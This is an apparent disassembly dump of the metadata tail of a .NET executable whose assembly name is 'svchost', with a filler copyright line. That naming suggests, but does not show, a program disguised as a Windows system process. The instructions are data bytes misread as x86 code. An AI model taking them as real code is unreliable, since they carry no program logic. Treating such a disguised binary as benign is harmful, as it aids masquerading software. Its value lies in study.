  40b231:	08 08                	or     %cl,(%eax)
  40b233:	08 12                	or     %dl,(%edx)
  40b235:	21 06                	and    %eax,(%esi)
  40b237:	00 01                	add    %al,(%ecx)
  40b239:	12 49 11             	adc    0x11(%ecx),%cl
  40b23c:	45                   	inc    %ebp
  40b23d:	04 20                	add    $0x20,%al
  40b23f:	01 02                	add    %eax,(%edx)
  40b241:	1c 06                	sbb    $0x6,%al
  40b243:	00 03                	add    %al,(%ebx)
  40b245:	01 0e                	add    %ecx,(%esi)
  40b247:	0e                   	push   %cs
  40b248:	0e                   	push   %cs
  40b249:	04 07                	add    $0x7,%al
  40b24b:	02 08                	add    (%eax),%cl
  40b24d:	08 33                	or     %dh,(%ebx)
  40b24f:	07                   	pop    %es
  40b250:	26 1d 11 45 1d 12    	es sbb $0x121d4511,%eax
  40b256:	49                   	dec    %ecx
  40b257:	0f 05                	syscall
  40b259:	08 08                	or     %cl,(%eax)
  40b25b:	08 08                	or     %cl,(%eax)
  40b25d:	08 08                	or     %cl,(%eax)
  40b25f:	08 12                	or     %dl,(%edx)
  40b261:	21 0e                	and    %ecx,(%esi)
  40b263:	1c 0e                	sbb    $0xe,%al
  40b265:	0e                   	push   %cs
  40b266:	0e                   	push   %cs
  40b267:	08 08                	or     %cl,(%eax)
  40b269:	1d 1c 1d 1c 08       	sbb    $0x81c1d1c,%eax
  40b26e:	08 08                	or     %cl,(%eax)
  40b270:	08 08                	or     %cl,(%eax)
  40b272:	08 08                	or     %cl,(%eax)
  40b274:	1d 1c 08 12 21       	sbb    $0x2112081c,%eax
  40b279:	08 08                	or     %cl,(%eax)
  40b27b:	08 08                	or     %cl,(%eax)
  40b27d:	08 08                	or     %cl,(%eax)
  40b27f:	08 12                	or     %dl,(%edx)
  40b281:	21 05 00 01 08 1d    	and    %eax,0x1d080100
  40b287:	0e                   	push   %cs
  40b288:	05 07 03 08 08       	add    $0x8080307,%eax
  40b28d:	08 08                	or     %cl,(%eax)
  40b28f:	07                   	pop    %es
  40b290:	04 1c                	add    $0x1c,%al
  40b292:	0e                   	push   %cs
  40b293:	12 35 12 39 05 00    	adc    0x53912,%dh
  40b299:	01 12                	add    %edx,(%edx)
  40b29b:	55                   	push   %ebp
  40b29c:	0e                   	push   %cs
  40b29d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40b2a2:	0e                   	push   %cs
  40b2a3:	04 20                	add    $0x20,%al
  40b2a5:	01 01                	add    %eax,(%ecx)
  40b2a7:	02 05 20 01 01 11    	add    0x11010120,%al
  40b2ad:	59                   	pop    %ecx
  40b2ae:	06                   	push   %es
  40b2af:	00 01                	add    %al,(%ecx)
  40b2b1:	12 39                	adc    (%ecx),%bh
  40b2b3:	12 35 03 06 11 0c    	adc    0xc110603,%dh
  40b2b9:	03 06                	add    (%esi),%eax
  40b2bb:	11 10                	adc    %edx,(%eax)
  40b2bd:	03 06                	add    (%esi),%eax
  40b2bf:	11 14 03             	adc    %edx,(%ebx,%eax,1)
  40b2c2:	06                   	push   %es
  40b2c3:	11 18                	adc    %ebx,(%eax)
  40b2c5:	03 06                	add    (%esi),%eax
  40b2c7:	11 1c 03             	adc    %ebx,(%ebx,%eax,1)
  40b2ca:	06                   	push   %es
  40b2cb:	11 20                	adc    %esp,(%eax)
  40b2cd:	03 06                	add    (%esi),%eax
  40b2cf:	11 24 03             	adc    %esp,(%ebx,%eax,1)
  40b2d2:	06                   	push   %es
  40b2d3:	11 28                	adc    %ebp,(%eax)
  40b2d5:	03 06                	add    (%esi),%eax
  40b2d7:	11 2c 03             	adc    %ebp,(%ebx,%eax,1)
  40b2da:	06                   	push   %es
  40b2db:	11 30                	adc    %esi,(%eax)
  40b2dd:	03 06                	add    (%esi),%eax
  40b2df:	11 34 03             	adc    %esi,(%ebx,%eax,1)
  40b2e2:	06                   	push   %es
  40b2e3:	11 38                	adc    %edi,(%eax)
  40b2e5:	03 06                	add    (%esi),%eax
  40b2e7:	11 3c 03             	adc    %edi,(%ebx,%eax,1)
  40b2ea:	06                   	push   %es
  40b2eb:	11 40 02             	adc    %eax,0x2(%eax)
  40b2ee:	06                   	push   %es
  40b2ef:	02 04 20             	add    (%eax,%eiz,1),%al
  40b2f2:	01 01                	add    %eax,(%ecx)
  40b2f4:	08 08                	or     %cl,(%eax)
  40b2f6:	01 00                	add    %eax,(%eax)
  40b2f8:	08 00                	or     %al,(%eax)
  40b2fa:	00 00                	add    %al,(%eax)
  40b2fc:	00 00                	add    %al,(%eax)
  40b2fe:	1e                   	push   %ds
  40b2ff:	01 00                	add    %eax,(%eax)
  40b301:	01 00                	add    %eax,(%eax)
  40b303:	54                   	push   %esp
  40b304:	02 16                	add    (%esi),%dl
  40b306:	57                   	push   %edi
  40b307:	72 61                	jb     0x40b36a
  40b309:	70 4e                	jo     0x40b359
  40b30b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b30c:	6e                   	outsb  %ds:(%esi),(%dx)
  40b30d:	45                   	inc    %ebp
  40b30e:	78 63                	js     0x40b373
  40b310:	65 70 74             	gs jo  0x40b387
  40b313:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40b31a:	77 73                	ja     0x40b38f
  40b31c:	01 05 20 01 01 11    	add    %eax,0x11010120
  40b322:	6d                   	insl   (%dx),%es:(%edi)
  40b323:	08 01                	or     %al,(%ecx)
  40b325:	00 07                	add    %al,(%edi)
  40b327:	01 00                	add    %eax,(%eax)
  40b329:	00 00                	add    %al,(%eax)
  40b32b:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40b32e:	00 07                	add    %al,(%edi)
  40b330:	73 76                	jae    0x40b3a8
  40b332:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  40b335:	73 74                	jae    0x40b3ab
  40b337:	00 00                	add    %al,(%eax)
  40b339:	05 01 00 00 00       	add    $0x1,%eax
  40b33e:	00 0f                	add    %cl,(%edi)
  40b340:	01 00                	add    %eax,(%eax)
  40b342:	0a 31                	or     (%ecx),%dh
  40b344:	36 37                	ss aaa
  40b346:	34 34                	xor    $0x34,%al
  40b348:	2d 39 36 35 33       	sub    $0x33353639,%eax
  40b34d:	00 00                	add    %al,(%eax)
  40b34f:	21 01                	and    %eax,(%ecx)
  40b351:	00 1c 43             	add    %bl,(%ebx,%eax,2)
  40b354:	6f                   	outsl  %ds:(%esi),(%dx)
  40b355:	70 79                	jo     0x40b3d0
  40b357:	72 69                	jb     0x40b3c2
  40b359:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40b35f:	20 31                	and    %dh,(%ecx)
  40b361:	36 37                	ss aaa
  40b363:	34 34                	xor    $0x34,%al
  40b365:	2d 39 36 35 33       	sub    $0x33353639,%eax
  40b36a:	20 32                	and    %dh,(%edx)
  40b36c:	30 32                	xor    %dh,(%edx)
  40b36e:	35 00 00 29 01       	xor    $0x1290000,%eax
  40b373:	00 24 33             	add    %ah,(%ebx,%esi,1)
  40b376:	61                   	popa
  40b377:	64 34 64             	fs xor $0x64,%al
  40b37a:	34 36                	xor    $0x36,%al
  40b37c:	35 2d 30 62 65       	xor    $0x6562302d,%eax
  40b381:	63 2d 34 33 61 39    	arpl   %ebp,0x39613334
  40b387:	2d 61 64 63 38       	sub    $0x38636461,%eax
  40b38c:	2d 38 66 31 62       	sub    $0x62316638,%eax
  40b391:	36 39 66 62          	cmp    %esp,%ss:0x62(%esi)
  40b395:	64 38 31             	cmp    %dh,%fs:(%ecx)
  40b398:	34 00                	xor    $0x0,%al
  40b39a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40b39d:	00 07                	add    %al,(%edi)
  40b39f:	31 2e                	xor    %ebp,(%esi)
  40b3a1:	30 2e                	xor    %ch,(%esi)
  40b3a3:	30 2e                	xor    %ch,(%esi)
  40b3a5:	30 00                	xor    %al,(%eax)
  40b3a7:	00 49 01             	add    %cl,0x1(%ecx)
  40b3aa:	00 1a                	add    %bl,(%edx)
  40b3ac:	2e 4e                	cs dec %esi
  40b3ae:	45                   	inc    %ebp
  40b3af:	54                   	push   %esp
  40b3b0:	46                   	inc    %esi
  40b3b1:	72 61                	jb     0x40b414
  40b3b3:	6d                   	insl   (%dx),%es:(%edi)
  40b3b4:	65 77 6f             	gs ja  0x40b426
  40b3b7:	72 6b                	jb     0x40b424
  40b3b9:	2c 56                	sub    $0x56,%al
  40b3bb:	65 72 73             	gs jb  0x40b431
  40b3be:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40b3c5:	38 01                	cmp    %al,(%ecx)
  40b3c7:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40b3cb:	46                   	inc    %esi
  40b3cc:	72 61                	jb     0x40b42f
  40b3ce:	6d                   	insl   (%dx),%es:(%edi)
  40b3cf:	65 77 6f             	gs ja  0x40b441
  40b3d2:	72 6b                	jb     0x40b43f
  40b3d4:	44                   	inc    %esp
  40b3d5:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40b3dc:	61                   	popa
  40b3dd:	6d                   	insl   (%dx),%es:(%edi)
  40b3de:	65 12 2e             	adc    %gs:(%esi),%ch
  40b3e1:	4e                   	dec    %esi
  40b3e2:	45                   	inc    %ebp
  40b3e3:	54                   	push   %esp
  40b3e4:	20 46 72             	and    %al,0x72(%esi)
  40b3e7:	61                   	popa
  40b3e8:	6d                   	insl   (%dx),%es:(%edi)
  40b3e9:	65 77 6f             	gs ja  0x40b45b
  40b3ec:	72 6b                	jb     0x40b459
  40b3ee:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40b3f1:	38 05 20 02 01 02    	cmp    %al,0x2010220
  40b3f7:	02 06                	add    (%esi),%al
  40b3f9:	01 00                	add    %eax,(%eax)
  40b3fb:	01 01                	add    %eax,(%ecx)
	...
  40b409:	00 00                	add    %al,(%eax)
  40b40b:	00 10                	add    %dl,(%eax)
	...
  40b415:	00 00                	add    %al,(%eax)
  40b417:	00 1c 96             	add    %bl,(%esi,%edx,4)
  40b41a:	00 00                	add    %al,(%eax)
  40b41c:	44                   	inc    %esp
  40b41d:	b4 00                	mov    $0x0,%ah
	...
  40b427:	00 5e b4             	add    %bl,-0x4c(%esi)
  40b42a:	00 00                	add    %al,(%eax)
  40b42c:	00 20                	add    %ah,(%eax)
	...
  40b442:	00 00                	add    %al,(%eax)
  40b444:	50                   	push   %eax
  40b445:	b4 00                	mov    $0x0,%ah
	...
  40b44f:	00 00                	add    %al,(%eax)
  40b451:	00 5f 43             	add    %bl,0x43(%edi)
  40b454:	6f                   	outsl  %ds:(%esi),(%dx)
  40b455:	72 45                	jb     0x40b49c
  40b457:	78 65                	js     0x40b4be
  40b459:	4d                   	dec    %ebp
  40b45a:	61                   	popa
  40b45b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40b462:	72 65                	jb     0x40b4c9
  40b464:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40b468:	6c                   	insb   (%dx),%es:(%edi)
  40b469:	00 00                	add    %al,(%eax)
  40b46b:	00 00                	add    %al,(%eax)
  40b46d:	00 ff                	add    %bh,%bh
  40b46f:	25 00 20 40 00       	and    $0x402000,%eax
